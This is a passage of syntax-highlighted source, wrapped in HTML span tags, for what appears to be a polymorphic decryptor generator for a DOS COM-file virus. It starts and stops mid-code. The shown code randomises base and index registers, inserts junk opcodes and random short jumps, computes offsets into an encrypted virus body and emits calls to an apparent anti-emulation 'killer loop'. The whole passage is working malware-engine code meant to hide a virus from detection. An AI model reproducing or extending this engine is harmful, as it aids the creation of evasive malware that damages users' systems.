        </span><span class="sc11">$75h</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc11">$deltab</span><span class="sc0"> </span><span class="sc11">OFS_Kloop_outer</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">// jnz OFS_Kloop_outer      
</span><span class="sc0">                

        </span><span class="sc2">// pop registers
</span><span class="sc0">        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">kl_reg2</span><span class="sc10">|</span><span class="sc4">58h</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">kl_reg1</span><span class="sc10">|</span><span class="sc4">58h</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">$0C3h</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// RET
</span><span class="sc0">
        </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">LB_endofKillerLoop</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">// --------------------------------------------------------------------------------------------
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">CallKillerLoopFuc</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_UseKillerLoop</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   
    </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  </span><span class="sc11">$0e8h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$deltaw</span><span class="sc0"> </span><span class="sc11">OFS_KillerLoop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">   </span><span class="sc2">//   CALL  KillerLoop
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">







</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
// Initialize everything 
// --------------------------------------------------------------------------------------------
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">Init</span><span class="sc0">  </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc2">// Init IP
</span><span class="sc0">    </span><span class="sc11">select</span><span class="sc0">  </span><span class="sc11">EXi_IsCOM</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">IP</span><span class="sc10">=</span><span class="sc4">100h</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">IP</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0f0h</span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">randvar</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">1fh</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc2">// Initialize those variables    
</span><span class="sc0">    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_UseDisplacement</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">Displacement</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_PointerMode</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">IndexDisplacement</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">IndexDisplacement</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">IndexDisplacement</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">SillyPointerShiftB</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">   
    </span><span class="sc11">SillyPointerShiftA</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">   


    </span><span class="sc11">SW_Sectionsdone</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">// 000=none 001=first   010=second   100=third    
</span><span class="sc0">
    </span><span class="sc2">//those labels are used as variables. Will get recalculated. Are defined as labels because 
</span><span class="sc0">    </span><span class="sc2">// spl v2.2 doesn't let you use variables with the "offset" and "delta" keywords for backpatching
</span><span class="sc0">    </span><span class="sc2">// values.   
</span><span class="sc0">    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">PointerSetValue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">PointerCheckValue</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">PointerFixValue</span><span class="sc10">;</span><span class="sc0">
    

    </span><span class="sc11">DynaKillConflicts</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">// Kill'em All
</span><span class="sc0">
        

    </span><span class="sc2">// We set the BaseRegister;
</span><span class="sc0">    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_BaseReg</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">BaseRegister</span><span class="sc10">=</span><span class="sc4">3</span><span class="sc10">;</span><span class="sc11">BaseRegister</span><span class="sc10">=</span><span class="sc4">5</span><span class="sc10">;};</span><span class="sc0">
    </span><span class="sc2">// We set the IndexRegister;
</span><span class="sc0">    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_IndexReg</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">IndexRegister</span><span class="sc10">=</span><span class="sc4">6</span><span class="sc10">;</span><span class="sc11">IndexRegister</span><span class="sc10">=</span><span class="sc4">7</span><span class="sc10">;};</span><span class="sc0">

    </span><span class="sc2">// Set the IncreaseRegister;
</span><span class="sc0">    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_PointerMode</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_IndexReg</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">IncreaseRegister</span><span class="sc10">=</span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc11">IncreaseRegister</span><span class="sc10">=</span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_BaseReg</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">IncreaseRegister</span><span class="sc10">=</span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc11">IncreaseRegister</span><span class="sc10">=</span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">     
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_BaseReg</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">IncreaseRegister</span><span class="sc10">=</span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc11">IncreaseRegister</span><span class="sc10">=</span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">     
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_BaseReg</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">IncreaseRegister</span><span class="sc10">=</span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc11">IncreaseRegister</span><span class="sc10">=</span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">     
    </span><span class="sc10">};</span><span class="sc0">

</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">















</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
// Fin
// --------------------------------------------------------------------------------------------
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">Fin</span><span class="sc0">    </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">   

    </span><span class="sc2">// calculate length
</span><span class="sc0">    </span><span class="sc11">EXo_DecryptorVirusLength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IP</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">EXo_DecryptorStart</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_Direction</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">// Direction down 
</span><span class="sc0">    </span><span class="sc11">all</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">PointerSetValue</span><span class="sc10">=((</span><span class="sc11">OFS_EncryptedVirusBodyStart</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">SillyPointerShiftB</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">Displacement</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">IndexDisplacement</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">PointerCheckValue</span><span class="sc10">=(((</span><span class="sc11">OFS_EncryptedVirusBodyStart</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">SillyPointerShiftB</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">Displacement</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">IndexDisplacement</span><span class="sc10">)+(</span><span class="sc11">OFS_EncryptedVirusBodyEnd</span><span class="sc10">-</span><span class="sc11">OFS_EncryptedVirusBodyStart</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">PointerFixValue</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">-(</span><span class="sc11">SillyPointerShiftB</span><span class="sc10">+</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">PointerFixValue</span><span class="sc10">=</span><span class="sc11">PointerFixValue</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">PointerFixValue</span><span class="sc10">=</span><span class="sc11">PointerFixValue</span><span class="sc10">+</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc2">// Direction Up
</span><span class="sc0">    </span><span class="sc11">all</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">PointerSetValue</span><span class="sc10">=(((</span><span class="sc11">OFS_EncryptedVirusBodyStart</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">SillyPointerShiftB</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">Displacement</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">IndexDisplacement</span><span class="sc10">)+(</span><span class="sc11">OFS_EncryptedVirusBodyEnd</span><span class="sc10">-</span><span class="sc11">OFS_EncryptedVirusBodyStart</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">PointerSetValue</span><span class="sc10">=</span><span class="sc11">PointerSetValue</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">PointerSetValue</span><span class="sc10">=</span><span class="sc11">PointerSetValue</span><span class="sc10">-</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">PointerCheckValue</span><span class="sc10">=((</span><span class="sc11">OFS_EncryptedVirusBodyStart</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">SillyPointerShiftB</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">Displacement</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">IndexDisplacement</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">PointerCheckValue</span><span class="sc10">=</span><span class="sc11">PointerCheckValue</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">PointerCheckValue</span><span class="sc10">=</span><span class="sc11">PointerCheckValue</span><span class="sc10">-</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">PointerFixValue</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">-(</span><span class="sc11">SillyPointerShiftB</span><span class="sc10">+</span><span class="sc11">SillyPointerShiftA</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">PointerFixValue</span><span class="sc10">=</span><span class="sc11">PointerFixValue</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">PointerFixValue</span><span class="sc10">=</span><span class="sc11">PointerFixValue</span><span class="sc10">-</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc10">};</span><span class="sc0"> 
    </span><span class="sc10">};</span><span class="sc0">


    </span><span class="sc11">OFS_EncryptedVirusBodyStart2</span><span class="sc10">=</span><span class="sc11">OFS_EncryptedVirusBodyStart2</span><span class="sc10">-</span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">    


</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">
































</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
// Gargages.
// --------------------------------------------------------------------------------------------
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">garbage</span><span class="sc0">  </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SillyJump</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">SillyJump</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">SillyJump</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">SillyJump</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">$090h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// NOP
</span><span class="sc0">    </span><span class="sc11">$0F5h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// CMC
</span><span class="sc0">    </span><span class="sc11">$0FBh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// STI
</span><span class="sc0">    </span><span class="sc11">$0FCh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// CLD 
</span><span class="sc0">    </span><span class="sc11">$0F8h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// CLC
</span><span class="sc0">    </span><span class="sc11">$0F9h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// STC
</span><span class="sc0">    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// No garbage
</span><span class="sc0">    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// No garbage
</span><span class="sc0">    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// No garbage
</span><span class="sc0">    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// No garbage
</span><span class="sc0">    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// No garbage
</span><span class="sc0">    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// No garbage
</span><span class="sc0">    </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// No garbage
</span><span class="sc10">};</span><span class="sc0">


</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SillyJumpSize</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">SillyJump</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">$0EBh</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc2">// emit op-code of JMP imm8    
</span><span class="sc0">    </span><span class="sc11">SillyJumpSize</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0Fh</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">10h</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// SillyJumpSize is now between Fh and 1Fh  
</span><span class="sc0">    </span><span class="sc11">$SillyJumpSize</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc2">// emit the lower byte of garbagesize
</span><span class="sc0">    </span><span class="sc11">IP</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IP</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">SillyJumpSize</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc2">// Inc the Instruction Pointer   
</span><span class="sc10">};</span><span class="sc0">                  </span><span class="sc2">// virtually we follow the JMP!
//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">





</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">MovPointerToBase</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10111000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BaseRegister</span><span class="sc10">;};</span><span class="sc0">      </span><span class="sc2">// Mov base,????
</span><span class="sc0">        </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">$8Dh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_BaseReg</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$1Eh</span><span class="sc10">;</span><span class="sc11">$2Eh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0"> </span><span class="sc2">// Lea base,[????]
</span><span class="sc0">    </span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc11">$offset</span><span class="sc0"> </span><span class="sc11">PointerSetValue</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">MovPointerToIndex</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10111000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">IndexRegister</span><span class="sc10">;};</span><span class="sc0">     </span><span class="sc2">// Mov index,????
</span><span class="sc0">        </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">$8Dh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_IndexReg</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$36h</span><span class="sc10">;</span><span class="sc11">$3Eh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">    </span><span class="sc2">// Lea index,[????]
</span><span class="sc0">    </span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc11">$offset</span><span class="sc0"> </span><span class="sc11">PointerSetValue</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">



</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">MovIndexDisplacementToIndex</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10111000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">IndexRegister</span><span class="sc10">;};</span><span class="sc0">     </span><span class="sc2">// Mov index,????
</span><span class="sc0">        </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">$8Dh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_IndexReg</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$36h</span><span class="sc10">;</span><span class="sc11">$3Eh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">    </span><span class="sc2">// Lea index,[????]
</span><span class="sc0">    </span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc11">$IndexDisplacement</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">IndexDisplacement</span><span class="sc10">&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">


</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">SetPointerReg</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_PointerMode</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">MovPointerToIndex</span><span class="sc10">;</span><span class="sc0">  
        </span><span class="sc11">MovPointerToBase</span><span class="sc10">;</span><span class="sc0">       
        </span><span class="sc11">random</span><span class="sc10">{</span><span class="sc11">MovPointerToBase</span><span class="sc10">;</span><span class="sc11">MovIndexDisplacementToIndex</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc11">MovPointerToBase</span><span class="sc10">;</span><span class="sc0">   
    </span><span class="sc10">};</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">










</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
// DecryptorFirstPart 
// --------------------------------------------------------------------------------------------
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">DecryptorFirstPart</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">


    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_Sectionsdone</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> 
        </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc11">$0E9h</span><span class="sc10">;</span><span class="sc11">$deltaw</span><span class="sc0"> </span><span class="sc11">OFS_VirusBody</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc11">$0E9h</span><span class="sc10">;</span><span class="sc11">$deltaw</span><span class="sc0"> </span><span class="sc11">OFS_VirusBody</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0"> 
        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">OFS_FirstPart</span><span class="sc10">;</span><span class="sc0"> 

    </span><span class="sc11">random</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CallInt16Fuc</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">CallKillerLoopFuc</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">SetPointerReg</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_UseRegForKey</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0"> 
            </span><span class="sc11">SetKeyReg</span><span class="sc10">;</span><span class="sc0"> 
            </span><span class="sc2">//noop; 
</span><span class="sc0">        </span><span class="sc10">};</span><span class="sc0"> 
        </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_Segment</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">shift</span><span class="sc10">{</span><span class="sc11">$0Eh</span><span class="sc10">;</span><span class="sc11">$1Fh</span><span class="sc10">;};</span><span class="sc0"> </span><span class="sc11">shift</span><span class="sc10">{</span><span class="sc11">$0Eh</span><span class="sc10">;</span><span class="sc11">$07h</span><span class="sc10">;};</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0"> 
    </span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_Sectionsdone</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//000/001
</span><span class="sc0">        </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc11">$0E9h</span><span class="sc10">;</span><span class="sc11">$deltaw</span><span class="sc0"> </span><span class="sc11">LB_DecryptLoop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//010/011
</span><span class="sc0">        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//100/101
</span><span class="sc0">        </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc11">$0E9h</span><span class="sc10">;</span><span class="sc11">$deltaw</span><span class="sc0"> </span><span class="sc11">LB_DecryptLoop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//110/111
</span><span class="sc0">        </span><span class="sc10">};</span><span class="sc0">


    </span><span class="sc11">SW_Sectionsdone</span><span class="sc10">=</span><span class="sc11">SW_Sectionsdone</span><span class="sc10">|</span><span class="sc4">001</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">CryptSecondByte</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">CryptInstruction</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

</span><span class="sc2">//Emit the segment overide
</span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_Segment</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">$2Eh</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_BaseReg</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_PointerMode</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$3Eh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$3Eh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$3Eh</span><span class="sc10">;};</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
